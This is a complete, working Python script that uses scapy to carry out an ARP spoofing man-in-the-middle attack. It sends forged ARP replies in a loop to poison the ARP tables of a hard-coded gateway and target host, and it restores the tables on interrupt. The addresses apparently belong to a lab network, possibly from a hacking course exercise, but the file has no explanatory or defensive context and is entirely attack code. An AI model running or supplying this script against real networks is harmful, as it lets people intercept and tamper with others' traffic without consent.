#!/usr/bin/env python
import sys

import scapy.all as scapy
import time
import sys


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answer_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answer_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    package = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(package, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    package = scapy.ARP(op=2,pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(package, count=4, verbose=False)


gateway_ip = "10.0.2.1"
target_ip = "10.0.2.22"
try:
    sent_package_count = 0
    while True:
        spoof(gateway_ip, target_ip)
        spoof(target_ip, gateway_ip)
        sent_package_count = sent_package_count + 2
        print("\r[+] Package Sent: " + str(sent_package_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ... Resetting ARP table ... Please wait")
    restore(gateway_ip, target_ip)
    restore(target_ip, gateway_ip)
